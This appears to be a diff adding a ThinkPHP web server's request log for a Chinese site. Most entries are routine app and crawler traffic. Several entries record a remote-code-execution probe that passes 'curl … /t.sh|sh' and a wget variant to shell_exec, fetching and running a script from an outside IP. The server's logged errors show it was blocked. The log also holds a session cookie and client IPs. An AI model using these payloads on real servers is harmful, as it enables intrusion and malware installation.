+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'cookie' => 'PHPSESSID=nfc8687qglvf3rp208b9595tr7',
+  'user-agent' => 'Apache-HttpClient/5.1.3 (Java/1.8.0_342)',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'accept-encoding' => 'gzip, x-gzip, deflate',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T07:17:26+08:00 ] 172.17.142.12 27.187.72.62 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.027639s][吞吐率：36.18req/s] [内存消耗：2,175.21kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; MI 9 Transparent Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1734 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2640,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T07:17:33+08:00 ] 172.17.142.12 27.187.72.62 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.028232s][吞吐率：35.42req/s] [内存消耗：2,175.21kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; MI 9 Transparent Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1734 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2640,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T07:28:33+08:00 ] 172.17.142.12 27.187.72.62 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.035496s][吞吐率：28.17req/s] [内存消耗：2,175.21kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; MI 9 Transparent Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1734 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2640,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T07:28:33+08:00 ] 172.17.142.12 27.187.72.62 POST /index.php/handle/Wifi/wxapplist
+[ info ] www.jiajiazxgg.com/index.php/handle/Wifi/wxapplist [运行时间：0.059363s][吞吐率：16.85req/s] [内存消耗：2,448.63kb] [文件加载：50]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Wifi',
+    2 => 'wxapplist',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; MI 9 Transparent Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1734 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '2',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ RUN ] app\handle\controller\Wifi->wxapplist[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Wifi.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T07:28:39+08:00 ] 172.17.142.12 27.187.72.62 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.028667s][吞吐率：34.88req/s] [内存消耗：2,175.21kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; MI 9 Transparent Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1734 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2640,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T07:28:47+08:00 ] 172.17.142.12 27.187.72.62 POST /index.php/handle/Xcx/getUserInfo
+[ info ] www.jiajiazxgg.com/index.php/handle/Xcx/getUserInfo [运行时间：0.027181s][吞吐率：36.79req/s] [内存消耗：2,175.21kb] [文件加载：46]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'handle',
+    1 => 'Xcx',
+    2 => 'getUserInfo',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'referer' => 'https://servicewechat.com/wx63e3f8696c8618e8/18/page-frame.html',
+  'accept-encoding' => 'gzip,compress,br,deflate',
+  'content-type' => 'application/json',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 11; MI 9 Transparent Edition Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.99 XWEB/4375 MMWEBSDK/20221206 Mobile Safari/537.36 MMWEBID/1734 MicroMessenger/8.0.32.2300(0x28002055) WeChat/arm64 Weixin NetType/WIFI Language/zh_CN ABI/arm64 MiniProgramEnv/android',
+  'charset' => 'utf-8',
+  'content-length' => '11',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+)
+[ info ] [ PARAM ] array (
+  'id' => 2640,
+)
+[ info ] [ RUN ] app\handle\controller\Xcx->getUserInfo[ /www/wwwroot/www.jiajiazxgg.com/webapp/handle/controller/Xcx.php ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T07:45:04+08:00 ] 172.17.142.12 164.92.227.200 GET /
+[ info ] 39.106.3.107/ [运行时间：0.027285s][吞吐率：36.65req/s] [内存消耗：1,720.14kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T08:21:42+08:00 ] 172.17.142.12 35.195.93.98 GET /
+[ info ] 39.106.3.107/ [运行时间：0.018782s][吞吐率：53.24req/s] [内存消耗：1,721.02kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'x-datadog-sampling-priority' => '1',
+  'x-datadog-parent-id' => '11008533996651165581',
+  'x-datadog-trace-id' => '7184439285336258366',
+  'connection' => 'keep-alive',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'user-agent' => 'python-requests/2.28.2',
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T09:40:50+08:00 ] 172.17.142.12 109.237.97.141 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20194.40.243.205/t.sh|sh
+[ info ] 39.106.3.107:443/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20194.40.243.205/t.sh|sh [运行时间：0.027028s][吞吐率：37.00req/s] [内存消耗：1,540.17kb] [文件加载：42]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'shell_exec',
+    1 => 
+    array (
+      0 => 'curl 194.40.243.205/t.sh|sh',
+    ),
+  ),
+)
+[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]shell_exec() has been disabled for security reasons[/www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php:174]
+---------------------------------------------------------------
+[ 2023-02-12T09:41:03+08:00 ] 172.17.142.12 154.89.5.196 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.019198s][吞吐率：52.09req/s] [内存消耗：1,719.66kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept' => '*/*',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T09:43:46+08:00 ] 172.17.142.12 183.136.225.32 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.028449s][吞吐率：35.15req/s] [内存消耗：1,720.15kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'keep-alive',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T09:49:25+08:00 ] 172.17.142.12 183.136.225.32 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.027851s][吞吐率：35.91req/s] [内存消耗：1,720.25kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T10:31:18+08:00 ] 172.17.142.12 193.118.53.194 GET /
+[ info ] 39.106.3.107/ [运行时间：0.019206s][吞吐率：52.07req/s] [内存消耗：1,720.14kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T10:38:02+08:00 ] 172.17.142.12 34.222.251.67 GET /
+[ info ] jiajiazxgg.com/ [运行时间：0.030780s][吞吐率：32.49req/s] [内存消耗：1,720.11kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
+  'host' => 'jiajiazxgg.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T10:57:17+08:00 ] 172.17.142.12 198.235.24.132 GET /
+[ info ] 39.106.3.107:443/ [运行时间：0.022744s][吞吐率：43.97req/s] [内存消耗：1,720.45kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T11:22:51+08:00 ] 172.17.142.12 134.209.144.126 GET /
+[ info ] 39.106.3.107/ [运行时间：0.019593s][吞吐率：51.04req/s] [内存消耗：1,720.14kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'accept' => '*/*',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
+  'host' => '39.106.3.107',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T11:45:27+08:00 ] 172.17.142.12 111.172.73.244 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.019052s][吞吐率：52.49req/s] [内存消耗：1,721.66kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-language' => 'zh-CN,zh;q=0.9',
+  'accept-encoding' => 'gzip, deflate',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T11:46:22+08:00 ] 172.17.142.12 180.163.220.67 GET /
+[ info ] www.jiajiazxgg.com/ [运行时间：0.018572s][吞吐率：53.84req/s] [内存消耗：1,721.72kb] [文件加载：45]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip, deflate',
+  'referer' => 'http://baidu.com/',
+  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+  'user-agent' => 'Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36',
+  'upgrade-insecure-requests' => '1',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'connection' => 'keep-alive',
+  'host' => 'www.jiajiazxgg.com',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+  'httponly' => true,
+  'secure' => false,
+)
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2023-02-12T13:12:13+08:00 ] 172.17.142.12 109.237.96.124 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20194.40.243.205/t.sh|sh
+[ info ] 39.106.3.107:443/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=curl%20194.40.243.205/t.sh|sh [运行时间：0.019543s][吞吐率：51.17req/s] [内存消耗：1,540.17kb] [文件加载：42]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/public/../webapp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'Index',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'accept-encoding' => 'gzip',
+  'connection' => 'close',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36',
+  'host' => '39.106.3.107:443',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'shell_exec',
+    1 => 
+    array (
+      0 => 'curl 194.40.243.205/t.sh|sh',
+    ),
+  ),
+)
+[ info ] [ RUN ] think\App->invokeFunction[ /www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]shell_exec() has been disabled for security reasons[/www/wwwroot/www.jiajiazxgg.com/yado/library/think/App.php:174]
+---------------------------------------------------------------
+[ 2023-02-12T13:12:14+08:00 ] 172.17.142.12 109.237.96.124 GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20194.40.243.205/t.sh|sh
+[ info ] 39.106.3.107:443/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20-q%20-O%20-%20194.40.243.205/t.sh|sh [运行时间：0.026762s][吞吐率：37.37req/s] [内存消耗：1,540.17kb] [文件加载：42]
+[ info ] [ LANG ] /www/wwwroot/www.jiajiazxgg.com/yado/lang/zh-cn.php
